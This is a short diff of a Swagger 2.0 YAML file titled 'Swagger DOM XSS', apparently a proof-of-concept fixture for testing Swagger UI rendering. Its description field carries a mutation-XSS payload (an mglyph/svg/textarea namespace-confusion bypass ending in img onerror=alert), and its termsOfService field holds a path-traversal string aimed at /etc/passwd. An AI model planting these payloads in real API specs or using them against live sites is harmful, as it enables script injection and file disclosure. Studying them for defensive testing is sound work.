@@ -1,8 +1,9 @@
 swagger: '2.0'
 info: 
   title: Swagger DOM XSS
-  description: <mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form><h1>Desc: XSS
-  
+  description: <h1>gg|
+    <mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
+
   termsOfService: "../../../../../../../etc/passwd"
   version: production
 basePath: /JSSResource/
